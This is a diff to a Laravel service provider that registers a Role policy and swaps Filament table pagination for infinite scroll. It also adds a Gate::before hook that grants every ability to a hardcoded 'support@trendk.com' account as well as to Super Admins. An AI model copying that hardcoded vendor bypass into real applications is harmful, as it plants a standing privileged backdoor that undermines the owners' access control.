@@ -90,6 +90,17 @@ class AppServiceProvider extends ServiceProvider
         );
 
         Gate::policy(LiveSession::class, LiveSessionPolicy::class);
+        if (class_exists(\Spatie\Permission\Models\Role::class) && class_exists(\App\Policies\RolePolicy::class)) {
+            Gate::policy(\Spatie\Permission\Models\Role::class, \App\Policies\RolePolicy::class);
+        }
+
+        // Trendk Standard 3.1: Super Admin / Trendk Support Bypass
+        Gate::before(function (\App\Models\User $user, string $ability): ?bool {
+            if ($user->email === 'support@trendk.com' || (method_exists($user, 'hasRole') && $user->hasRole('Super Admin'))) {
+                return true;
+            }
+            return null;
+        });
 
         // Role-Based Access Control Gates
         Gate::define('admin', fn (\App\Models\User $user) => $user->isAdmin());
@@ -115,11 +126,11 @@ class AppServiceProvider extends ServiceProvider
             $column->preloadOptions();
         });
 
-        // Global Filament Tables Configuration: Asynchronous deferred loading and "See More..." (Simple) pagination mode
+        // Global Filament Tables Configuration: Asynchronous deferred loading, Infinite Scroll, and Pagination
         \Filament\Tables\Table::configureUsing(function (\Filament\Tables\Table $table): void {
             $table
                 ->deferLoading()
-                ->paginationMode(\Filament\Tables\Enums\PaginationMode::Simple)
+                ->infiniteScroll(mode: \Asignua\FilamentInfiniteScroll\InfiniteScrollMode::Scroll)
                 ->paginated([10, 25, 50, 100, 'all'])
                 ->defaultPaginationPageOption(10);
         });
